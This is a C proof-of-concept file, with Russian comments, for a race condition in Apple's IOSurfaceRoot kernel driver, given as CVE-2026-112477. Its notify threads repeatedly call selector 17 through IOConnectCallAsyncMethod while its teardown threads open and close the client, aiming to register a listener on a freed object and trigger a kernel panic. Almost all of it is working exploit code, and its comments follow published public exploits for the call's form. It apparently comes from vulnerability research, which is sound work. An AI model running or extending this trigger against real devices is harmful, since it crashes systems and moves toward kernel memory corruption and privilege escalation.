/* probe_iorace.c — гонка CVE-2026-112477: s_set_surface_notify vs client teardown.
 *
 * Механика (docs/FINDINGS_cve_2026_112477_iosurface_race.md):
 *   27.0: регистрация listener не проверяет dying-флаг клиента;
 *         teardown сначала освобождает ресурсы, потом удаляет из реестра.
 *   Окно: регистрация во время teardown -> запись в реестре на мёртвый объект.
 *
 * Проба: поток A в цикле зовёт selector 17 (s_set_surface_notify) на живом
 * клиенте и поверхности; поток B в цикле закрывает и переоткрывает клиент.
 * Чистый userland, без ядерных структур. Паника = гонка поймана.
 */
typedef unsigned long size_t;
typedef unsigned int mach_port_t;
typedef void *id;
typedef const void *CFTypeRef;

extern long write(int fd, const void *b, size_t n);
extern void *dlopen(const char *p, int m);
extern void *dlsym(void *h, const char *s);
extern int usleep(unsigned int us);
extern int pthread_create(unsigned long *t, const void *a, void *(*f)(void *), void *arg);
extern int pthread_setname_np(const char *n);

#define RTLD_LAZY 1

static void put(const char *s) {
    const char *p = s; size_t n = 0;
    while (p[n]) n++;
    if (n) write(1, p, n);
}
static void putu(unsigned long long v) {
    char b[24]; int i = 0;
    if (!v) { write(1, "0", 1); return; }
    while (v) { b[i++] = (char)('0' + (v % 10ULL)); v /= 10ULL; }
    while (i--) write(1, &b[i], 1);
}

/* IOKit */
typedef int (*fn_io_service_get_matching)(mach_port_t, const void *);
typedef int (*fn_io_service_open)(mach_port_t, mach_port_t, unsigned int, mach_port_t *);
typedef int (*fn_io_service_close)(mach_port_t);
typedef int (*fn_io_connect_call_method)(mach_port_t, unsigned int,
    const unsigned long long *, unsigned int, const void *, size_t,
    unsigned long long *, unsigned int *, void *, size_t *);
typedef mach_port_t (*fn_mach_task_self)(void);

/* CFDictionary для create_surface fast path не нужен: используем struct-args селектор 6 */

static fn_io_service_get_matching p_getsvc;
static fn_io_service_open p_open;
static fn_io_service_close p_close;
static fn_io_connect_call_method p_call;
static void *p_cfstr;
static mach_port_t g_task;

static volatile int g_stop;
static volatile long g_notify_ok, g_notify_err, g_cycles;
static volatile unsigned int g_surface_id;
static volatile mach_port_t g_conn;

struct FastCreateArgs {
    unsigned long long address;
    unsigned int width, height, pixel_format, bytes_per_element, bytes_per_row, alloc_size;
};
struct LockResult {
    unsigned char pad1[0x18];
    unsigned int surface_id;
    unsigned char pad2[0xf60 - 0x18 - 4];
};

static mach_port_t open_client(void) {
    void *(*p_matching)(const char *) = dlsym(dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY), "IOServiceMatching");
    if (!p_matching) return 0;
    mach_port_t svc = p_getsvc(0, p_matching("IOSurfaceRoot"));
    if (!svc) return 0;
    mach_port_t conn = 0;
    int kr = p_open(svc, g_task, 0, &conn);
    if (kr != 0) return 0;
    return conn;
}

static unsigned int make_surface(mach_port_t conn) {
    (void)conn;
    /* IOSurfaceCreate из фреймворка (проверенный путь из probe_res) */
    void *io = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
    if (!io || !cf) return 0;
    id (*dict_new)(CFTypeRef, unsigned long, void *, void *) =
        (id (*)(CFTypeRef, unsigned long, void *, void *))dlsym(cf, "CFDictionaryCreateMutable");
    void (*dict_set)(id, const void *, const void *) =
        (void (*)(id, const void *, const void *))dlsym(cf, "CFDictionarySetValue");
    id (*num_new)(CFTypeRef, long, void *) =
        (id (*)(CFTypeRef, long, void *))dlsym(cf, "CFNumberCreate");
    void (*cf_rel)(CFTypeRef) = (void (*)(CFTypeRef))dlsym(cf, "CFRelease");
    id (*surf_create)(CFTypeRef) = (id (*)(CFTypeRef))dlsym(io, "IOSurfaceCreate");
    unsigned int (*surf_getid)(id) = (unsigned int (*)(id))dlsym(io, "IOSurfaceGetID");
    CFTypeRef *kw = (CFTypeRef *)dlsym(io, "kIOSurfaceWidth");
    CFTypeRef *kh = (CFTypeRef *)dlsym(io, "kIOSurfaceHeight");
    CFTypeRef *kb = (CFTypeRef *)dlsym(io, "kIOSurfaceBytesPerElement");
    CFTypeRef *kf = (CFTypeRef *)dlsym(io, "kIOSurfacePixelFormat");
    void *kcb = dlsym(cf, "kCFTypeDictionaryKeyCallBacks");
    void *vcb = dlsym(cf, "kCFTypeDictionaryValueCallBacks");
    if (!dict_new || !dict_set || !num_new || !cf_rel || !surf_create || !surf_getid
        || !kw || !kh || !kb || !kf) return 0;

    id dict = dict_new(0, 0, kcb, vcb);
    if (!dict) return 0;
    const void *keys[4] = { kw ? *kw : 0, kh ? *kh : 0, kb ? *kb : 0, kf ? *kf : 0 };
    int vals[4] = { 256, 256, 4, 0x42475241 };
    for (int i = 0; i < 4; i++) {
        id num = num_new(0, 3, &vals[i]);
        if (!num) { cf_rel(dict); return 0; }
        dict_set(dict, keys[i], num);
        cf_rel(num);
    }
    id surf = surf_create(dict);
    cf_rel(dict);
    if (!surf) return 0;
    unsigned int sid = surf_getid(surf);
    static volatile int dbg = 0;
    if (dbg < 5) {
        dbg++;
        put("IORACE create sid=");
        putu(sid);
        put("\n");
    }
    /* surf намеренно не release — поверхность живёт в системе, гонка на id */
    return sid;
}

static void *thread_notify(void *arg) {
    (void)arg;
    pthread_setname_np("IORACE-A");
    /* s_set_surface_notify — ASYNC метод: wake_port + refcon + scalars.
     * Форма по публичным PoC (async_wake/ziVA): IOConnectCallAsyncScalarMethod.
     * Обычный IOConnectCallMethod даёт BadArgument — не та форма аргументов. */
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    /* Точная ABI из async_wake (Ian Beer): IOConnectCallAsyncMethod,
     * scalarCnt=0, structureInput = 24 байта {1,2,3}, wake port + MAKE_SEND,
     * reference={0} count 1. */
    int (*p_async)(mach_port_t, unsigned int, mach_port_t,
                   unsigned long long *, unsigned int,
                   const unsigned long long *, unsigned int,
                   const void *, size_t,
                   unsigned long long *, unsigned int *,
                   void *, size_t *) =
        iokit ? (int (*)(mach_port_t, unsigned int, mach_port_t,
                         unsigned long long *, unsigned int,
                         const unsigned long long *, unsigned int,
                         const void *, size_t,
                         unsigned long long *, unsigned int *,
                         void *, size_t *))
              dlsym(iokit, "IOConnectCallAsyncMethod") : 0;
    int (*p_port_alloc)(unsigned int, unsigned int, mach_port_t *) =
        (int (*)(unsigned int, unsigned int, mach_port_t *))dlsym(dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY), "mach_port_allocate");
    int (*p_insert_right)(unsigned int, mach_port_t, mach_port_t, unsigned int) =
        (int (*)(unsigned int, mach_port_t, mach_port_t, unsigned int))dlsym(dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY), "mach_port_insert_right");
    if (!p_async || !p_port_alloc || !p_insert_right) {
        put("IORACE no-async-sym\n");
        return 0;
    }
    /* wake port: receive right + send right (ядро шлёт через send right) */
    mach_port_t wp = 0;
    p_port_alloc(g_task, 1, &wp);                       /* MACH_PORT_RIGHT_RECEIVE */
    /* MACH_MSG_TYPE_MAKE_SEND = 20: создать send right, сохранив receive */
    int irr = p_insert_right(g_task, wp, wp, 20);
    put("IORACE wakeport=");
    putu(wp);
    put(" insert_right=");
    putu((unsigned)irr);
    put("\n");
    usleep(120000);

    static volatile int dbg = 0;
    unsigned long long refcon[1] = { 0 };
    unsigned long long inscal[1] = { 0 };
    unsigned long long istruct[3] = { 0x4141414141414141ULL, 2, 0x4343434343434343ULL };
    unsigned long long oscal[16] = {0};
    char ostruct[4096];
    while (!g_stop) {
        mach_port_t c = g_conn;
        unsigned int sid = g_surface_id;
        if (c && sid && wp) {
            unsigned int oscal_cnt = 0;
            size_t ostruct_cnt = 0;
            int kr = p_async(c, 17, wp, refcon, 1, inscal, 0, istruct, 24,
                             oscal, &oscal_cnt, ostruct, &ostruct_cnt);
            if (kr == 0) g_notify_ok++; else g_notify_err++;
            if (dbg < 8 && kr != 0) {
                dbg++;
                put("IORACE n17a kr=0x");
                const char *hex = "0123456789abcdef";
                char hb[9];
                for (int i = 7; i >= 0; i--) hb[7 - i] = hex[(kr >> (i * 4)) & 15];
                hb[8] = 0;
                char *hp = hb;
                while (hp[0] == '0' && hp[1]) hp++;
                put(hp);
                put("\n");
                usleep(120000);
            }
        }
    }
    return 0;
}

static void *thread_teardown(void *arg) {
    (void)arg;
    pthread_setname_np("IORACE-B");
    while (!g_stop) {
        mach_port_t c = open_client();
        if (!c) { usleep(100); continue; }
        unsigned int sid = make_surface(c);
        g_conn = c;
        g_surface_id = sid;
        usleep(20);               /* короткое окно: notify успевает дёрнуть живую поверхность */
        p_close(c);               /* teardown -> F3 */
        g_conn = 0;
        g_cycles++;
    }
    return 0;
}

int main(void) {
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_LAZY);
    if (!iokit || !cf) { put("IORACE no-libs\n"); return 0; }
    p_getsvc = (fn_io_service_get_matching)dlsym(iokit, "IOServiceGetMatchingService");
    p_open = (fn_io_service_open)dlsym(iokit, "IOServiceOpen");
    p_close = (fn_io_service_close)dlsym(iokit, "IOServiceClose");
    p_call = (fn_io_connect_call_method)dlsym(iokit, "IOConnectCallMethod");
    p_cfstr = dlsym(cf, "CFStringCreateWithCString");
    if (!p_getsvc || !p_open || !p_close || !p_call || !p_cfstr) { put("IORACE no-syms\n"); return 0; }
    {
        mach_port_t *p_task = (mach_port_t *)dlsym(dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY), "mach_task_self_");
        if (!p_task) { put("IORACE no-task\n"); return 0; }
        g_task = *p_task;
    }

    mach_port_t c0 = open_client();
    put("IORACE open conn=");
    putu(c0);
    put("\n");
    if (!c0) { put("IORACE END\n"); return 0; }
    unsigned int sid0 = make_surface(c0);
    put("IORACE surf=");
    putu(sid0);
    put("\n");

    /* Калибровка sel 17 на стабильном соединении, ДО запуска потоков гонки */
    {
        void *iokit2 = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        int (*p_async)(mach_port_t, unsigned int, mach_port_t,
                       unsigned long long *, unsigned int,
                       const unsigned long long *, unsigned int,
                       const void *, size_t,
                       unsigned long long *, unsigned int *,
                       void *, size_t *) =
            iokit2 ? (int (*)(mach_port_t, unsigned int, mach_port_t,
                             unsigned long long *, unsigned int,
                             const unsigned long long *, unsigned int,
                             const void *, size_t,
                             unsigned long long *, unsigned int *,
                             void *, size_t *))
                  dlsym(iokit2, "IOConnectCallAsyncMethod") : 0;
        int (*p_port_alloc)(unsigned int, unsigned int, mach_port_t *) =
            (int (*)(unsigned int, unsigned int, mach_port_t *))dlsym(dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY), "mach_port_allocate");
        int (*p_insert_right)(unsigned int, mach_port_t, mach_port_t, unsigned int) =
            (int (*)(unsigned int, mach_port_t, mach_port_t, unsigned int))dlsym(dlopen("/usr/lib/libSystem.B.dylib", RTLD_LAZY), "mach_port_insert_right");
        if (p_async && p_port_alloc && p_insert_right) {
            mach_port_t wp = 0;
            p_port_alloc(g_task, 1, &wp);
            p_insert_right(g_task, wp, wp, 20);  /* MACH_MSG_TYPE_MAKE_SEND */
            put("IORACE cal wakeport=");
            putu(wp);
            put("\n");
            usleep(100000);
            unsigned long long refc[1] = { 0 };
            unsigned long long inscal[1] = { 0 };
            unsigned long long istruct[3] = { 1, 2, 3 };  /* structure input, 24 байта */
            unsigned long long oscal[16] = {0};
            char ostruct[4096];
            unsigned int oscal_cnt = 0;
            size_t ostruct_cnt = 0;
            int kr = p_async(c0, 17, wp, refc, 1, inscal, 0, istruct, 24,
                             oscal, &oscal_cnt, ostruct, &ostruct_cnt);
            put("IORACE cal kr=0x");
            const char *hex = "0123456789abcdef";
            char hb[9];
            for (int i = 7; i >= 0; i--) hb[7 - i] = hex[(kr >> (i * 4)) & 15];
            hb[8] = 0;
            char *hp = hb;
            while (hp[0] == '0' && hp[1]) hp++;
            put(hp);
            put("\n");
            usleep(120000);
        } else {
            put("IORACE cal no-syms\n");
        }
    }

    g_conn = c0;
    g_surface_id = sid0;

    /* Усиленная гонка: 4 notify-потока + 3 teardown-потока, 60 секунд.
     * Teardown без usleep — максимальный темп open/close, чтобы окно
     * teardown-колбэков пересекалось с notify чаще. */
    unsigned long th[7];
    for (int i = 0; i < 4; i++) pthread_create(&th[i], 0, thread_notify, 0);
    for (int i = 0; i < 3; i++) pthread_create(&th[4 + i], 0, thread_teardown, 0);

    for (int i = 0; i < 60; i++) usleep(1000000);   /* 60 секунд гонки */

    g_stop = 1;
    usleep(200000);
    put("IORACE notify_ok=");
    usleep(150000);
    putu((unsigned long long)g_notify_ok);
    usleep(150000);
    put(" err=");
    usleep(150000);
    putu((unsigned long long)g_notify_err);
    usleep(150000);
    put(" cycles=");
    usleep(150000);
    putu((unsigned long long)g_cycles);
    usleep(150000);
    put("\n");
    usleep(200000);
    put("IORACE END\n");
    usleep(4000000);
    return 0;
}